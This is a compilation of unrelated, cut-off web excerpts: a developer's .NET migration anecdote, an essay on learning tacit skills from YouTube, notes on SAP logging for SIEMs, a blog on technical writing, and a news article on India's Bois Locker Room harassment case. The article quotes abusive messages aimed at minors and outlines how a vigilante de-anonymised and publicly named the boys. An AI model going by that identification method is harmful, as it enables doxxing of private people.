a reduced pay rate, or be replaced. A few of us chose to remain. One colleague in particular, who was instrumental in designing and building the application’s UI, chose to leave. He was unceremoniously replaced with two junior contractors who combined were far less effective than he had been. Although we had more work to do, morale was low for those who remained.</p>  <p>Over the next few years, our team of five grew to 20. Four times the size does not equate to four times the productivity. In many ways, we seemed to be much less effective. We struggled to keep up with the ever-expanding business requirements. Feature after feature was requested. New users and new content were added, putting a strain on an architecture that had been built for fewer than a dozen users. Training demands increased. The venerable VB6 was showing its age. It was time for something new.</p> <p>The company provided all of its developers with an MSDN Subscription, and a few us were excited by the release of Visual Studio 2003. Windows XP was still fresh, and the two seemed to work flawlessly together. We decided to start experimenting with .NET and C# to see whether we could provide the users with the features and the performance they needed.</p>  <p>At first, the idea of switching to a newer technology was met with mild curiosity. The leadership authorized a proof of concept. “Go do something and then show the rest of the team.”</p> <p>We decided to hire a contractor with proven experience in .NET, though the fact that it was only a couple of years old made this difficult. We found a local consultant who had been using it since its introduction.</p> <p>One of the tasks we assigned to him was to review our new .NET code and let us know where and how it could be improved.</p> <h2 id="trycatch-as-flow-control">Try/Catch as Flow Control</h2> <p>One of the first things he uncovered was large blocks of nested try/catch statements used to implement complex flow control. One instance he found was a single function with six or seven nested try/catch blocks. When asked about it, the developer who had implemented the function said he had heard that if/then was inefficient, so he used try/catch instead. No amount of persuasion could convince him that he had it backwards.</p> <h2 id="for-every-rule-there-is-an-exception">For Every Rule There is an Exception</h2> <p>Speaking of try/catch, every time an exception was caught, it was swallowed, and a new exception was thrown in its place. The pattern in .NET is to catch only those exceptions you can handle. The rest should bubble up naturally to higher levels of your application. It is acceptable to catch and rethrow, but there are only a few specific ways to do that. Throwing a brand new exception is not usually one of them. Trying to explain that to the other developers resulted in repeated explanations that it was the consultant who did not understand. My favorite line from those meetings was, “Let me say it again so you’ll understand.”</p> <h2 id="isup">IsUp</h2> <p>One of the improvements that had been made was the implementation of a set of web services. Our consultant discovered that every web service call was preceded by a separate call to an endpoint called “IsUp” to ensure the web server was listening, before making the actual call.</p> <p>In 2005, bandwidth was not quite what it is in 2020, and each call was relatively expensive. Not only was this wasteful, it also did not accomplish its goal. On more than one occasion, IsUp would return true, and the next call would fail anyway due to the service being down.</p> <p>Upon learning about this revelation, our management decided it would probably not hurt anything to leave it in place.</p> <h2 id="everyone-into-the-pool">Everyone Into the Pool</h2> <p>One of the benefits .NET offered was robust database connection pooling. The pattern Microsoft suggested was to create an ADO.NET connection object every time you needed one, and release it immediately when you have finished using it. The system would maintain a pool of connections behind the scenes for you.</p> <p>Rather than using ADO.NET, however, one of our contractors decided that it would make more sense to roll his own connection pooling system. When our new consultant pointed this out, he was accused of not understanding the subtle advantages our own pooling system had over Microsoft’s.</p>  <p>After a few weeks of this, our new consultant was beyond frustrated. We sat down and had a heart-to-heart talk. He felt he was adding no value to the project or the team. His suggestions were ignored or belittled. In fact, my manager essentially told him that his services were no longer required, and that his contract would not be renewed. I asked him whether he would stick around until it ended. His reply was amusing. He said that although he could stay and continue to “turn the money crank,” he felt that doing so would compromise his professional integrity. Six weeks after he started, our consultant left.</p>  <p>Right about the time our .NET consultant left, the word came down from management that our .NET experiment was a failure, and that we were to go back to VB 6 for all new code.</p> <p>A few short weeks later, we were having a particularly difficult problem with one of our application components. VB simply did not have the language facilities to deal with this particular issue without massive brute-force coding. C#, on the other hand, had a very straightforward way to solve the problem.</p> <p>I finally made the decision to implement that particular component in C#. My plan was to show management that .NET was still a viable option for our project, and this small enhancement would be the proof. The solution was everything I had hoped it would be: short, elegant, and easy to understand.</p> <p>At this point in the story, I wish I still had the source code that I could share. However, <a href="https://walkingriver.com/perjury">I learned the hard way not to keep source code when leaving a company</a>.</p>  <p>We had a policy on our team that each new feature would be revealed on a team-wide NetMeeting conference, attended by anyone interested. The primary developer on the feature would explain it, show the passing unit tests, demonstrate the feature, and then answer questions from the rest of the team. We had these meetings a few times per week, as I recall.</p> <p>This call was my time to shine, or so I imagined. I went through all of the normal steps, and all was going well. There were four critical things about this particular call that will soon become apparent:</p> <ol> <li>Most of the team was on the call, about 25 in total.</li> <li>My manager was in attendance.</li> <li>HP’s enterprise …</li></ol></div></div></div></div>

      <p><em>This is Part 4 in a <a href="https://commoncog.com/blog/the-tacit-knowledge-series/">series on tacit knowledge</a>. Read <a href="https://commoncog.com/blog/three-kinds-of-tacit-knowledge/">Part 3</a> here.</em></p><p>We can’t really talk about tacit knowledge today without talking about YouTube.</p><p>A couple months ago, Samo Burja wrote an essay on Medium titled <a href="https://medium.com/@samo.burja/the-youtube-revolution-in-knowledge-transfer-cb701f82096a">The Youtube Revolution in Knowledge Transfer</a>, a piece that I loved and linked to in <a href="https://us17.campaign-archive.com/?u=843adfbaa3230c81aa0738b53&amp;id=0ced4f1a2c">issue 50</a> of the Commonplace newsletter. Burja observed the following things:</p><ul><li>First, YouTube is now a <em>thing</em>.</li><li>Second, quality digital cameras have become cheap enough for mass use. This in turn means that everyone can start producing YouTube-worthy content, and have those videos be discoverable, because — hey! — YouTube is now a thing.</li><li>Three, this <em>also</em> means that people with expertise in <em>thing X</em> can now film themselves doing <em>thing X</em>, and clued-in practitioners can watch these experts do <em>thing X</em> and become <em>really good themselves.</em></li><li>Burja then posits that we’ll see an explosion of tacit skill transfer over the next decade, correlated with the rise of YouTube use, because certain kinds of human expertise may only really be taught through emulation, not through instruction alone.</li></ul><p>Burja’s whole essay is great, and I urge you to read it in <a href="https://medium.com/@samo.burja/the-youtube-revolution-in-knowledge-transfer-cb701f82096a">full</a>.</p><p>But there’s a twist here. I linked to Burja’s piece in Issue #50 of my newsletter, which went out on the 24th of September 2019. Burja’s piece was published on the 18th of September. And I’m writing this on the 29th of June the next year. So it’s basically taken me more than nine months before I realised that Burja’s observations may be <em>generalisable</em> — that is, once you realise that YouTube is a great place to learn tacit things, this fact applies to skills <em>far beyond</em> the set of skills Burja talks about in his essay.</p><p>In this piece, we’re going to walk through a number of ways you may use YouTube for tacit knowledge acquisition, on a domain-by-domain basis. I’m afraid the anecdotes here are necessarily domain-specific, but the purpose of this piece is to give you certain patterns that you may adapt to whatever skillset you want to acquire in whatever domain you’re interested in.</p><h2 id="youtube-use-in-judo">YouTube use in Judo</h2><p>Let’s start with Judo.</p><p>I'm biased here because I played Judo competitively as a teenager. But Judo is interesting for our purposes because it isn’t a particularly popular sport. In Malaysia, where I’m from, the number of people who play Judo can probably fit into a small football stadium. And the active players — the ones who do Judo regularly — can probably fit into half that. Contrast this population with a sport like badminton, say, or football, or tennis.</p><p>What this means is that it is difficult to get good as a judoka in most countries around the world. This fact isn’t limited to Malaysia; in the US, for instance, pretty much every Olympic Judo champion comes from a tiny family-run club called Pedro’s Judo Centre in Wakefield, Massachusetts. Judo isn’t particularly popular outside the club, either. If you find yourself anywhere else in the country: tough luck.</p><p>During the worst of the COVID-19 lockdowns earlier this year, Malaysian Judo coach Oon Yeoh began interviewing international Judo players from all over the world, in a series he named <em>Judo In The Time of COVID-19</em>. He <a href="https://kljudo.com/judo-concepts-lesson-22-how-to-analyze-a-video-clip/">wrote</a>, of that experience:</p><blockquote>One thing I noticed after interviewing many judo players is that those from very strong judo nations tend not to watch so many judo videos whereas those who come from countries where judo is not so strong, tend to watch a lot of judo videos.<p>The reason is obvious. If you're from a strong judo nation, there's a lot of institutional support and good coaching, as well as sufficient training partners, training opportunities and competitions. All these combined give you everything you need to develop your skills in judo. <strong>But if you live in a place where there's very little judo, you're pretty much left to your own devices. In such circumstances, video is the best resource for you to learn things. </strong><em>(emphasis mine)</em></p></blockquote><p>Oon first learnt Judo in the US, and was exposed to video-based training from the beginning of his career. (To my knowledge, he remains — to this day — the only Malaysian to have fought in the World Championships). When he says ‘video is the best resource for you to learn things’, we have to be very clear what he means by this.</p><p>If you go to YouTube right now and enter a Judo technique, for instance, ‘uchimata’ — you’ll get a results page like so:</p><figure><img src="https://commoncog.com/blog/content/images/2020/06/Screenshot-2020-06-29-at-8.17.46-PM-1.png"></figure><p>The top result is an instructional by US Judo coach Shintaro Higashi:</p><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/qnMoNfZ2WiU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Higashi’s video on uchimata is particularly good, and instructionals are probably what you’re thinking of when you hear ‘YouTube’ and ‘learning’. But instructionals <em>aren’t</em> the only thing that Oon is talking about.</p><p>What Oon is more interested in is <em>analysis of competition footage</em>. I asked him to explain how he used video for this purpose, and he <a href="https://kljudo.com/judo-concepts-lesson-22-how-to-analyze-a-video-clip/">did</a>:</p><blockquote>Let's say you want to learn how a particular player does a particular technique. Here are some best practices:<p>a) Don't just watch just one or two examples of that player doing that technique. Watch multiple examples and try to identify trends or things that that player does in setting up the throw. Take for example, Takato's unique style of ouchi-gari. If you watch enough of them, you'll notice he only does this technique under very specific circumstances (against left-handers who are trying to push his head down). If you notice that, try to understand the reason why.</p><p>b) Pay particular attention to grips. How does he grip whenever he wants to do this technique. You will notice a familiar pattern to the gripping. Again, try to understand why.</p><p>c) There will be times when the technique fails. Watch those as well and try to understand what went wrong. What was different about this attempt that caused it to fail? Doing this will allow you to isolate the key success factors.</p><p>d) Try to look out for variations. Sometimes those differences are very subtle but they are significant. Understanding the variations (when they are used and why the variation are necessary) will give you a better grasp of the technique.</p><p>e) It is usually helpful to watch the technique in slow motion. If there is no slow motion replay of the clip available, you may have to download the clip and slow-mo it yourself using a simple video editing program. When I was a student there was no digital videos yet, only VHS cassettes, and I had to use two VCR machines to make slow motion loops of Koga's throws just so I could study them properly!</p></blockquote><p>In a separate interview with US Olympic silver medallist Travis Stevens, Oon asks about video, and Stevens <a href="http://kljudotraining.blogspot.com/2020/04/judo-in-time-of-covid-19-travis-stevens.html">answers</a>:</p><blockquote>There is a lot the cadets can do at home to prepare them for future success. Like <strong>learning how to break down a fight when watching videos, taking notes on training sessions</strong> <em>(emphasis mine)</em>, journaling, etc. Winning at judo isn’t just about hard work. There’s a lot more that goes into it than that, like analysis, mental training and so on.</blockquote><p>Why study competition footage, and not just instructionals? The answer falls out of everything we’ve explored in our previous posts on tacit knowledge. Expertise is difficult to explicate, and embodied knowledge can only loosely be captured through language. There usually isn't much of an overlap between the greatest practitioners and the greatest teachers in any given domain.</p><p>Plus: ask any serious Judo player, and they will tell you that there is <em>also</em> a gap between what is taught in the dojo, and what is used in competition. The charitable explanation here is that the best players can’t explain what they’re doing, because their somatic responses are tied to cues in implicit memory, which makes it impossible for them to notice. The slightly less charitable explanation is that there is a <a href="https://commoncog.com/blog/to-get-good-go-after-the-metagame/">metagame</a> that’s going on at the highest levels of Judo, and the shift in the current meta is kept opaque and available only to those who know how to watch out for it. The completely uncharitable explanation is that Judo is a sport with bad pedagogy, and most people don’t know how to teach it.</p><figure><img src="https://commoncog.com/blog/content/images/2020/06/bdf1b3347d045db83a9c988fb87c8629.jpg"><figcaption>Notice how world champion Maruyama Joshiro is using his leg to lift his opponent's.</figcaption></figure><figure><img src="https://commoncog.com/blog/content/images/2020/06/Screenshot-2020-06-30-at-5.35.29-PM.png"><figcaption>And compare that to Higashi's instructional, which uses the hip to lift.</figcaption></figure><p>(I’m perhaps being a little extreme in that last assessment; but — well, let’s talk about uchimata, shall we? There’s a <a href="https://www.youtube.com/watch?v=HZJcx2ppyB4">particularly good video</a> by YouTube user Judo Mat Lab that points out that the throw taught by Higashi, in its form above, is rarely seen in competition. Many top level athletes do something far simpler (they lift the opponent's leg and tilt, not lift their opponent with their hip) — in fact, the tilting form is what is most commonly seen in <a href="https://www.youtube.com/watch?v=Kd10gC4P310">MMA</a> and in <a href="https://www.youtube.com/watch?v=Xb-HW-6isyI">BJJ</a> as well. The funny thing is that when these judokas are asked to demonstrate uchimata, they execute <em>the classical, lifting version first.</em> This is an example of a piece of tacit knowledge that was successfully explicated into a wonderful, comprehensive explanation — but it took a talented YouTuber to do it, and in 2015, 133 years after Judo was first created.)</p><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/HZJcx2ppyB4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>So the solution here is to do what Oon figured out all those years ago: <em>don’t</em> wait for someone to come along and explain what’s going on. Don’t rely on instructionals alone. <em>Look at actual experts doing the actual thing.</em> In the context of Judo, this means developing the meta-skill of watching competition video yourself, in order to break a competitor’s technique down into its constituent parts. You try to figure out why it’s so effective; later, in the dojo, you attempt to replicate it by copying.</p><p>In fact, as we’ll soon see: this principle is generalisable. When you want to learn a skill on YouTube, you should spend a little bit of time watching instructionals, but then spend the rest of it <em>watching experts doing the actual thing</em>. The former is by definition explicit; the latter allows you to capture what is tacit.</p><h2 id="programming">Programming</h2><p>Let’s move on to programming, which is probably more relevant to the topic of careers.</p><p>When I started programming in university in 2009, there was already a fair amount of programming content on the web. This period coincided with the rise of the <a href="https://en.wikipedia.org/wiki/Massive_open_online_course">MO…</a></p></section></div>

Especially if you are trying to ingest the logs directly from the SAP system into your SIEM. There are different third party log  adapters and tools which will "translate" SAP log events and generate alerts in your SIEM solution, but often those are quite costly and represent an additional layer which we need to maintain. Therefore, ideally we will be able to integrate our SAP systems directly into our SIEM infrastructure without additional third party license cost and maintenance effort. </p><p id="h.p_CXb3t6_XihCc">In an SAP system you would like to monitor different types of logs like ICM/ICF logs, Gateway Logs, Security Audit Logs, and so on.</p><p id="h.p_po_zkbNki-gI">Some of the SAP logs have more common log syntax - e.g. ICM/ICF logs (transaction SMICM) which uses common Apache log format allowing flexible customization, which can be more easily ingested into a SIEM solution.

We would argue that it is feasible to do that on a productive system as well. A productive system with 50 000 users is expected to generate roughly 50 to 100 GB of logs per month. Log storage for a whole year would yield roughly 1TB of log data. Consider that also archiving can bring down the required disk space by a factor of  100.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><p>What is your story? How did you start writing your blog? Was it something that you decided to try since the start of covid? Over the months I’ve started to post some of the learning and technology I’ve came across at work. Over the months of writing, I found myself gaining so much more than what I started out to do. Everything starts with a single step. Before we take our first step, we often have a vision of how that finishing line may look like. We may also have some perspective of how the journey itself may look like. What do you know? As you take a step forward, and then another. You decide to take a pause and look back. You find your perspective of the world has changed just so much!</p>

<p>Today, I will be talking about two key parts of my journey:</p>
<br>
<ol>
<li>How did this whole venture start?</li>
</ol>

<p>Everyone starts their journey with a goal in mind. Simple and straight forward objectives to achieve! (:</p>
<br>
<ol start="2">
<li>What have i’ve I learnt thus far?</li>
</ol>

<p>Beyond the initial objectives, I found myself learning just so much as I share my learnings online. Not only does it help me to understand different topics better, it actually help me to change my perspective towards problems and better position me for my growth as a software engineer.</p>

<br>
<hr>
<br>
<h2>#1. How did this whole venture start?</h2>

<p>It started with just 3 simply purposes:</p>
<br>
<ol>
<li>Being more detail oriented</li>
</ol>

<p>I wanted to delve deeper into each of the topics and technology i am learning at work. So much to cover, but never really understanding each of it. The last thing you want to do is to get the job done without properly learning the best practices and finding that growth in you.</p>
<br>
<blockquote>
<p>Take a pause, and look a little closer</p>
</blockquote>
<br>
<ol start="2">
<li>Hone my technical skills</li>
</ol>

<p>This platform was intended for me to explore the different web development tools and understand the nuts and bolts behind the delivery of a good website. You are worth the value you give. And if you want to create value for people, you got to put in the work to hone that technical skill and deliver that tip top quality work</p>
<br>
<blockquote>
<p>There is no free meals in the world, if you want to create value, you got to earn the craft</p>
</blockquote>
<ol start="3">
<li>Improve on my writing</li>
</ol>

<p>I’ve always been a thrash writer. I even started out writing my posts in point forms as I was never able to articulate my thoughts coherently. But I realized the ability to articulate your point in a succinct and concise form is an art that needs to be developed. Over the months and numerous articles, I’ve started to learn how to put my thoughts into words and organize my thoughts for a meaningful sharing.</p>

<p>Here’s a reference to my first blog post to understand the drastic difference haha! <a ref="nofollow" target="_blank" href="https://blog.phuaxueyong.com/post/2020-01-26-first-post-of-2020/">Joshua’s first post back in January 2020</a></p>

<p>What i’ve gotten from this pet project didn’t just stop here. Rather, I have taken away so much more than what i intended to learn from the start. As i reflect back, I realized i’ve learnt way more than what I’ve intended to when i first start out. I believe many readers can resonate with that as well.</p>
<br>
<hr>
<br>
<h2>#2. What have i’ve I learnt thus far?</h2>

<p>I’ve learnt so many lessons from my writing adventure thus far! In this list, we will go through the top 5 of them. Do leave a comment below if you can resonate with any of them.</p>
<br>
<h3>1. Community is king</h3>

<p>To consistently be able to gather feedback on whatever you’ve written helps to create some discussions via the net. Especially if you know you’re touching an interesting topic that people has been talking about.</p>

<p>It is never to find the most glamorous topics to talk about just so you can be ‘part of the gang’. That sounds more like a FOMO to me. Don’t be a FOMO.</p>

<p>Find out because you genuinely want to learn. There isn’t time to be someone else, chasing other people’s attention.</p>

<p>In the space of technology, there has been so many topics and conversations about open-source. What is open-source?</p>
<br>
<blockquote>
<p>Open-source&nbsp;software (OSS) is a type of computer software in which&nbsp;source&nbsp;code is released under a license in which the copyright holder grants users the rights to study, change, and distribute the software to anyone and for any&nbsp;purpose. - wiki</p>
</blockquote>

<p>Open-source have its benefits that interestingly seems to contrary to common business thinking.</p>
<br>
<blockquote>
<p>I want to start my own solution, and I have to open source it for the world to see and replicate?</p>
</blockquote>

<p>Open sources have many benefits, of the many, i’ll list out a few:</p>
<br>
<ul>
<li>Ability to start small</li>
<li>Solid information security</li>
<li>Attract better talent</li>
<li>The power of crowd</li>
<li>better security</li>
<li>Faster to market</li>
</ul>

<p>References for open source advantages:</p>
<br>
<ul>
<li><a ref="nofollow" target="_blank" href="https://enterprisersproject.com/article/2015/1/top-advantages-open-source-offers-over-proprietary-solutions">top advantages for open-source</a></li>
<li><a ref="nofollow" target="_blank" href="https://opensource.com/article/17/8/enterprise-open-source-advantages">enterprise open source advantages</a></li>
</ul>
<br>
<h3>2. Writing leaves a story to be told a thousand times</h3>

<p>It sounds no-brainer but as I was part of the process, i came to see how informative articles allows you share your understanding of a topic multiple times without having to repeat yourself. Have you encountered situations where you have shared your story with your group of friends, and suddenly another friend of yours joined the conversation and realized he has missed out on the entire story, asking you to repeat again. But the efforts to repeat seems futile and you don’t seem to be able to recall the story as well as the<br>
first time around? Frustrating and hair-pulling</p>

<p><img src="https://media.tenor.com/images/955a6f2e7099ef24a2da8aba67b0bb8b/tenor.gif" alt=""></p>

<p>This is the situation writing helps to avoid. Write once, and the story lives on. Even for yourself. Sometimes we need a little self reminder of our own learning and sharing.</p>

<p>Even in the technology space, you find the need to do documentation. Technical documentation&nbsp;helps an intended audience&nbsp;use&nbsp;your product, understand your processes, and get unstuck. This audience can be end-users, administrators, colleagues or technicians. Whoever they are, documentation is intended to be clear, searchable and helpful for these people to understand and use your product or services as its intended for. A feature that is hidden and not shared with the audience is no feature at all (Unless it is intended to be hidden away of course).</p>
<br>
<blockquote>
<p>Writing solidifies the conversation</p>
</blockquote>
<br>
<h3>3. Train of thought is coming through</h3>

<p><img src="https://media.tenor.com/images/d977e88507428b258d89e27202450058/tenor.gif" alt=""></p>

<p>Tackling a new topic can be overwhelming when you first start out. You will find yourself bombarded with a ton of new technological terms. There is need for you to organize your thoughts, make sense and piece them together like a puzzle.</p>

<p>Have you done a jigsaw puzzle before? You don’t just tackle the pieces in the middle outta no where. You tackle the easiest parts, the sides. You try to find the ‘starting’ point of the information you are reading about, and that usually starts with a <strong>“what”</strong> question. “What is Cache?”, “what is WebRTC”.</p>
<br>
<blockquote>
<p>What are you dealing with? Find out with the <strong>“what”</strong> question</p>
</blockquote>

<p>Once you have a good understanding of the tool you are learning about - which is the ‘what’ question. The next thing you want to learn is “how”.</p>
<br>
<ul>
<li>How does cache work? - it generally works by storing in data in a fast access hardware such as RAM</li>
</ul>

<p>Here’s an article about how does cache work by <a ref="nofollow" target="_blank" href="https://aws.amazon.com/caching/#:~:text=How%20does%20Caching%20work%3F,the%20underlying%20slower%20storage%20layer.">Amazon</a></p>
<br>
<ul>
<li>How does WebRTC work? You can understand that by reading articles. One of which is written by me! Really bite size with good youtube video to solidify the learning. <a ref="nofollow" target="_blank" href="https://blog.phuaxueyong.com/post/2020-06-15-how-to-make-a-video-chat-app/">How to make video call application</a></li>
</ul>
<br>
<blockquote>
<p>How does a car work? How does a tool work? Find out the mechanics of the tool using the <strong>“how”</strong> question</p>
</blockquote>

<p>People usually just stop here. In technology, often times, by this point you are already swam with a ton of new terminologies and mental models that you can no longer follow the documentation. You will also start to feel your body heating up and a little uncomfortable sweating in your seat. (Speaking from experience from Singapore)</p>

<p>The next question you should strive to ask before you properly take a break is the <strong>“when”</strong> question. When do we use this tool?</p>

<p>When do we use cache? You use this tool when you have frequent database access, or high read requests such as a news article site. Fetch once, store at the front of the store, so people can accessible access it when information is requested.</p>
<br>
<div><p>When do we use WebRTC? When you want to utilize browser’s technology for media exchange which includes video and audio call use cases.</p></div>
<blockquote>
<p>Find out when you will need to use a tool? Ask the <strong>“when do you…”</strong> question.</p>
</blockquote>

<p>Until this point you have probably figured out these 3 questions “What”, “How”, “When”, have 2 remaining buddies - “Who”, “Where”.</p>

<p>Given the examples and the train of thought, give it a try on the <strong>who</strong> and <strong>where</strong> questions! The end goal is to find the purpose of the tool, and when to use it. Following a simple guideline as such can aid you as you navigate around challenging or foreign technology that crosses your path.</p>
<br>
<h3>4. Finding your own voice</h3>

<p>I have to admit my writing was pretty thrashy when i first started out. I was writing posts in point form because i wasn’t able to find the coherence needed to put my thoughts into words. Over the months, this ability starts to develop, and i find myself to be able to express different technical ideas as I understand them to be. I managed to find the words to string together to form the idea and flow I wish to convey to my readers.</p>

<p>Beyond the writing style, writing my articles has always been about sharing knowledge. Knowledge is one asset that is given to another and there are collectively more knowledge in the pool. It has always been sharing knowledge in ways that are comprehensive, bite size and relevant to the intended audience of your posts. I enjoy and find myself learning a ton more when I am required to present these information to the public. I wouldn’t want to mess up presenting inaccurate information. That would make me a fake new spreader. And that is the last thing I ever want to do.</p>

<p>All in all, such an initiative helps me to find the voice that feels “the most me”.</p>

<br>
<h3>5. Share because you never know who could learn from you</h3>

<p>You never know who might find your information useful! If it is organized and coherent, you will find that your knowledge could be the very information that someone else in the world is googling and trying to …</p></span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>T</span>his spring, a group of schoolboys in Delhi played an obscene guessing game. In a group chat on Instagram, one boy shared a photo of<strong> </strong>a girl with the group, challenging the others to guess her age. The prize for a correct guess: her social media handle. “Bad dressing sense,” one boy <a href="https://video-images.vice.com/test-uploads/_uncategorized/1588744369584-bois-locker-room.jpeg?resize=1575:*">commented</a>. “ikr [I know right],” replied the original poster, “But good tits.”&nbsp;</p>



<p>One of the alleged victims of the group, which became known as the Bois Locker Room chat, was Madhuri, a 17-year-old girl in Bangalore who asked to be identified by a pseudonym. She told <em>Rest of World</em> that, in April, she received an unsolicited message from one of the boys requesting nude photographs. “I refused, but he kept on insisting,” she said. She showed <em>Rest of World</em> a screenshot of his response: “You motherfucker. Send me pictures of your breasts. How dare you say no to me?” The boy then superimposed Madhuri’s face onto a pornographic picture and sent it to her. She blocked him. But a month later, she realized he also shared the picture on the Bois Locker Room chat. She soon learned she<strong> </strong>was not the only one. The group had targeted multiple underage girls with photo manipulation. “It was disgusting,” she said. “One boy replied that he preferred bigger breasts. Another said he’d like to rape me.” What Madhuri didn’t do is go to the police. “They don’t take [sexual-harassment cases] very seriously,” Madhuri told me. “Besides, my parents would have felt bad about me going public. You know what it’s like for girls. We’d be blamed first.”&nbsp;</p>



<p>Yet Madhuri and the other victims would soon attain some measure of justice via unconventional means. She sent the screenshots to <a href="https://www.instagram.com/shubhamcybercop/">@shubhamsinghcybercop</a>, an Instagram user who had quietly begun investigating the case.<strong> </strong>After recording her statement, he asked if she wished to submit a legal complaint; she declined. </p>



<p>The operator of the account is Shubham Singh, a 25-year-old wunderkind digital detective of sorts in Mumbai, some 1,400 kilometers away. He regards himself as a private investigator, gathering information to verify claims of online harassment and encouraging victims to pursue legal action. His vigilantism — what he calls “ethical hacking” — resides somewhere on the spectrum between the formal justice of the courts and the informal justice of the social-media tribunal. Despite his unorthodox methods, he has quickly become one of India’s most popular cybercrime&nbsp;experts, assisting Mumbai’s police in cases ranging from petty fraud to kidnapping, and even occasionally lending a hand to anti-terrorism efforts.</p>



<p>Several weeks after Madhuri’s exchange with the boy, screenshots from the Bois Locker Room were leaked onto <a href="https://www.indiatoday.in/india/story/bois-locker-room-delhi-schoolboys-create-group-to-share-lewd-photos-chats-on-classmates-1674303-2020-05-04">social media</a> after <a href="https://www.instagram.com/ashnaaasharmaa/">@ashnaaasharmaa</a>, an Instagram influencer, <a href="https://www.instagram.com/stories/highlights/17890085584516759/">shared</a> a list of the boys’ handles and requested that her followers expose “[t]hese cunts.” The story revealed that most of the boys attended several prominent private schools in Saket, an affluent South Delhi suburb. The details were shocking: In the chat — which included roughly 30 boys, some as young as 15 — the boys rated the attractiveness of underage girls’ bodies and exchanged their personal information. Some even shared lewd tales of alleged<strong> </strong>sexual encounters with the girls. National media outlets <a href="https://qz.com/india/1850737/delhi-boyslockerroom-chat-puts-spotlight-on-india-rape-culture/">swarmed</a> over the story, as Indian social media erupted in outrage. As <a href="https://pbs.twimg.com/media/EXKrLUnUEAE3SAs.jpg">more screenshots</a> from the chat emerged, the group members threatened to rape or leak nude photographs of the whistleblowers. One said: “I am going to Fuck every single [girl] who posted on their story” — a threat newspapers interpreted as rape.&nbsp;</p>

<p>But the Bois’ plans for revenge would be foiled, thanks in part to Singh. Over a Skype <em>chai</em> in late May,<strong> </strong>he told <em>Rest of World</em> that an influencer had tipped him off about the case by tagging him in an Instagram story and asking for his assistance in finding the boys. He said that soon after the story appeared, his inbox was flooded with screenshots from alleged victims. “On an average day, I get 10 to 20 messages,” he said, “but this time, I must have gotten over 200.” He had only a few blurred screenshots from the Bois’ chat that had gone viral — fearing public retaliation, members had deleted their Instagram accounts, seemingly eliminating any evidence. How, then, did he track them down? “Us ethical hackers, we have our techniques,” he grinned.&nbsp;</p>



<p>Singh explained that he first asked the girls who had approached him to send him screen recordings to confirm their stories. Next, he used a special tracking software to find their email addresses via their Instagram handles. After confirming those addresses, he searched Facebook for accounts registered under those emails and compared their Instagram pictures to those<strong> </strong>posted to<strong> </strong>their Facebook accounts.<strong> </strong>Once he confirmed the identities of the nine boys who were active participants in the leaked chats, Singh forwarded a WhatsApp message containing his findings<strong> </strong>to a police officer in New Delhi. He received no response. So he tracked down the boys’ parents and called them. “Since they were minors,” he said, “I wouldn’t speak to them directly. But their parents needed to know what their children were up to. I recommended that the boys seek counseling.”&nbsp;</p>



<p>Singh then shared the names of the nine boys on his own Instagram account. Their handles were also posted publicly by “<a href="https://www.instagram.com/wallofshamereal/?hl=en">Wall of Shame Real</a>,” an anonymous Instagram page that names and shames alleged sexual offenders. Its administrator invited the page’s 35,000-plus followers to bring forward more screenshots and stories of harassment that could be used as evidence against the boys. “Their parents have been informed. Now, for the real action, you need to step up and help sir [Singh] in the case,” the post read. (The administrator of the Wall of Shame Real page did not return<em> Rest of World</em>’s request for comment.)&nbsp;</p>

<p>On May 6, the <a href="https://www.hindustantimes.com/delhi-news/admin-of-instagram-group-bois-locker-room-arrested-devices-seized/story-9tQDaF32QglX2tnyGPP6wI.html"><em>Hindustan Times</em> reported</a> that the Delhi police had apprehended an administrator of the group chat — the result of a social media furor fomented, in large part, by Singh. With their elite private-school pedigrees and social-media savvy, these boys seemed to alert India to a generation of young people doing whatever they wanted to whomever they chose to — as much online as elsewhere in the world. It is still unclear what the consequences will be for the boys of Bois Locker Room, though many have been questioned by the police in recent weeks.</p>



<p>Singh’s decision to share the boys’ Instagram handles, some of which revealed their full names, seemed to skirt an ethical line. But he insisted that their handles had already been shared publicly before his involvement in the matter. “I don’t believe in trial by social media. Instagram is not a courtroom. I always verify my claims before I post them,” he said. At the same time, he acknowledged: “Sometimes, to get justice, you need to do unethical things.”</p>



<p>The Bois Locker Room<strong> </strong>case struck a chord with Indians still convulsed with anger over the treatment of women in their country. In 2012, a fatal gang rape on a bus in Delhi enraged the country and spurred legal and judicial reforms. Yet the horror remains. According to the <a href="https://www.reuters.com/article/us-india-rape-factbox/statistics-on-rape-in-india-and-some-well-known-cases-idUSKBN1YA0UV">latest statistics</a>, every day, 90 rapes are reported in India, but many more go unreported, due to fears and stigma.&nbsp;In the first three and a half months of 2018, more than five women were raped every day in the capital city. In February, a man <a href="https://www.bbc.co.uk/news/world-asia-india-51398295">allegedly raped a 5-year-old girl</a> within the grounds of the U.S. Embassy in Delhi.&nbsp;</p>



<p>Critics argue that the government has failed to address the heart of the problem: cultural notions of purity that lead third parties, particularly law enforcement, to blame the victim. A longtime police inspector with the<strong> </strong>Mumbai Crime Branch, who spoke to <em>Rest of World</em> on condition of anonymity, said that victims of sex crimes directly approach private investigators such as Singh out of convenience, not frustration. “If you lodge a claim, you will have to be questioned, have a character certificate taken … these things take a few days. People think going to the police is a waste of time — if I advertised free private help on Facebook, why wouldn’t people come to me? It’s just easier.”&nbsp;</p>



<p>The inspector disagreed that police fail to adequately protect sexual-harassment victims. “There may have been cases where officers behaved badly, but the government has now made lots of changes to help girls feel more comfortable approaching the police,” he said. “There are dedicated lady officers and help lines for sexual-harassment cases.”&nbsp;</p>



